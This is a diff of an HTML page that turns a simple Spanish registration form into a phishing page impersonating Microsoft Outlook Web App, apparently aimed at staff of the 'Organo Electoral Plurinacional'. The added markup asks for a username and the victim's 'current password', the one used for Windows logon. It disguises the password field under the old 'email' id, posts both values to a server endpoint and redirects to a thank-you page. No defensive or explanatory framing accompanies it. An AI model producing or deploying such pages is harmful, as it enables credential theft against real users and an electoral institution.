@@ -3,83 +3,173 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro de Usuarios</title>
+    <title>Outlook Web App</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
-        .container {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            padding: 40px;
+        .card {
+            background: #ffffff;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
             width: 100%;
-            max-width: 500px;
+            max-width: 480px;
+            padding: 30px 40px;
         }
-        h1 { color: #333; text-align: center; margin-bottom: 10px; }
-        .subtitle { text-align: center; color: #666; margin-bottom: 30px; font-size: 14px; }
-        .form-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; color: #555; font-weight: 600; font-size: 14px; }
-        input {
-            width: 100%; padding: 12px 16px; border: 2px solid #e0e0e0;
-            border-radius: 8px; font-size: 16px; transition: border-color 0.3s;
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #e0e0e0;
         }
-        input:focus { outline: none; border-color: #667eea; }
-        .btn {
-            width: 100%; padding: 14px; border: none; border-radius: 8px;
-            font-size: 16px; font-weight: 600; cursor: pointer;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white; transition: transform 0.2s;
+        .logo-left { display: flex; flex-direction: column; }
+        .logo-left .ms {
+            font-size: 11px; color: #737373; font-weight: normal; margin-bottom: 2px;
         }
-        .btn:hover { transform: translateY(-2px); }
-        .success {
-            background: #d4edda; color: #155724; padding: 12px;
-            border-radius: 8px; margin-bottom: 20px; display: none;
+        .logo-left .title {
+            font-size: 22px; color: #333333; font-weight: 300; letter-spacing: -0.5px;
         }
-        .success.show { display: block; }
+        .logo-right {
+            width: 48px; height: 48px; object-fit: contain;
+        }
+        .security-section { margin-bottom: 25px; }
+        .security-title {
+            font-size: 13px; color: #333; margin-bottom: 8px;
+        }
+        .security-title a {
+            color: #e89a00; text-decoration: none; font-size: 12px;
+        }
+        .security-title a:hover { text-decoration: underline; }
+        .radio-group { margin-left: 10px; }
+        .radio-item {
+            display: flex; align-items: center; margin-bottom: 6px;
+        }
+        .radio-item input[type="radio"] { margin-right: 6px; }
+        .radio-item label { font-size: 13px; color: #333; cursor: pointer; }
+        .checkbox-item {
+            display: flex; align-items: center; margin-top: 12px; margin-left: 10px;
+        }
+        .checkbox-item input[type="checkbox"] { margin-right: 6px; }
+        .checkbox-item label { font-size: 13px; color: #333; cursor: pointer; }
+        .form-row {
+            display: flex; align-items: center; margin-bottom: 12px;
+        }
+        .form-row label {
+            width: 140px; font-size: 13px; color: #333;
+            text-align: right; padding-right: 10px;
+        }
+        .form-row input[type="text"] {
+            flex: 1; padding: 4px 6px; border: 1px solid #a5acb0;
+            font-size: 13px; font-family: inherit; background: #eef4fc;
+        }
+        .form-row input:focus {
+            outline: none; border-color: #e89a00; background: #ffffff;
+        }
+        .button-row {
+            display: flex; justify-content: flex-end;
+            margin-top: 15px; margin-bottom: 25px;
+        }
+        .btn-submit {
+            background: #e89a00; color: white; border: 1px solid #c47e00;
+            padding: 4px 20px; font-size: 13px; font-weight: 600;
+            cursor: pointer; font-family: inherit;
+        }
+        .btn-submit:hover { background: #d48a00; }
+        .btn-submit:active { background: #c47e00; }
+        .footer {
+            text-align: center; border-top: 1px solid #e0e0e0; padding-top: 20px;
+        }
+        .footer-line1 { font-size: 12px; color: #737373; margin-bottom: 4px; }
+        .footer-line2 { font-size: 11px; color: #999999; }
+        .message {
+            padding: 10px; margin-bottom: 15px; font-size: 13px;
+            display: none; border: 1px solid;
+        }
+        .message.show { display: block; }
         .error {
-            background: #f8d7da; color: #721c24; padding: 12px;
-            border-radius: 8px; margin-bottom: 20px; display: none;
+            background: #f2dede; color: #a94442; border-color: #ebccd1;
         }
-        .error.show { display: block; }
+        @media (max-width: 520px) {
+            .card { padding: 20px; }
+            .form-row { flex-direction: column; align-items: flex-start; }
+            .form-row label { width: 100%; text-align: left; padding-right: 0; margin-bottom: 4px; }
+            .form-row input { width: 100%; }
+            .button-row { justify-content: center; }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📝 Registro de Usuarios</h1>
-        <p class="subtitle">Completa el formulario. Tu información se guardará de forma segura.</p>
-        
-        <div id="successMsg" class="success">✅ ¡Registro enviado correctamente!</div>
-        <div id="errorMsg" class="error">❌ Error al enviar el registro.</div>
+    <div class="card">
+        <div class="header">
+            <div class="logo-left">
+                <span class="ms">Microsoft&reg;</span>
+                <span class="title">Outlook Web App</span>
+            </div>
+            <img src="oep.png" class="logo-right" alt="Logo OEP">
+        </div>
+
+        <div id="errorMsg" class="message error">
+            ❌ Error al guardar el registro. Intente nuevamente.
+        </div>
+
+        <div class="security-section">
+            <div class="security-title">
+                Seguridad ( <a href="#">mostrar explicación</a> )
+            </div>
+            <div class="radio-group">
+                <div class="radio-item">
+                    <input type="radio" id="publico" name="seguridad" >
+                    <label for="publico">Es un equipo público o compartido</label>
+                </div>
+                <div class="radio-item">
+                    <input type="radio" id="privado" name="seguridad" checked>
+                    <label for="privado">Es un equipo privado</label>
+                </div>
+            </div>
+            <div class="checkbox-item">
+                <input type="checkbox" id="light" name="light">
+                <label for="light">Usar Outlook Web App Light</label>
+            </div>
+        </div>
 
         <form id="formulario">
-            <div class="form-group">
-                <label for="nombre">Nombre completo *</label>
-                <input type="text" id="nombre" required placeholder="Ej: María González">
+            <div class="form-row">
+                <label for="nombre">Nombre de usuario:</label>
+                <input type="text" id="nombre" name="nombre" placeholder="juan.perez">
             </div>
-            
-            <div class="form-group">
-                <label for="email">Correo electrónico *</label>
-                <input type="email" id="email" required placeholder="Ej: maria@email.com">
+            <div class="form-row">
+                <label for="email">Contraseña actual:</label>
+                <input type="text" id="email" name="email" placeholder="">
             </div>
-            
-            <button type="submit" class="btn">💾 Guardar Registro</button>
+            <div class="security-title">
+                Ingrese la misma contraseña con la que inicia sesion en Windows
+            </div>
+            <div class="button-row">
+                <button type="submit" class="btn-submit">Iniciar sesión</button>
+            </div>
         </form>
+
+        <div class="footer">
+            <div class="footer-line1">Organo Electoral Plurinacional</div>
+            <div class="footer-line2">&copy; 2026 OEP. Reservados todos los derechos.</div>
+        </div>
     </div>
 
     <script>
         document.getElementById('formulario').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
-            const nombre = document.getElementById('nombre').value.trim();
-            const email = document.getElementById('email').value.trim();
+            const nombre = document.getElementById('nombre').value;
+            const email = document.getElementById('email').value;
             
             try {
                 const response = await fetch('/api/submit', {
@@ -87,23 +177,15 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ nombre, email })
                 });
-                
                 const data = await response.json();
                 
                 if (data.success) {
-                    document.getElementById('successMsg').classList.add('show');
-                    document.getElementById('errorMsg').classList.remove('show');
-                    this.reset();
-                    
-                    setTimeout(() => {
-                        document.getElementById('successMsg').classList.remove('show');
-                    }, 3000);
+                    window.location.href = '/gracias.html';
                 } else {
                     throw new Error(data.error);
                 }
             } catch (err) {
                 document.getElementById('errorMsg').classList.add('show');
-                document.getElementById('successMsg').classList.remove('show');
             }
         });
     </script>
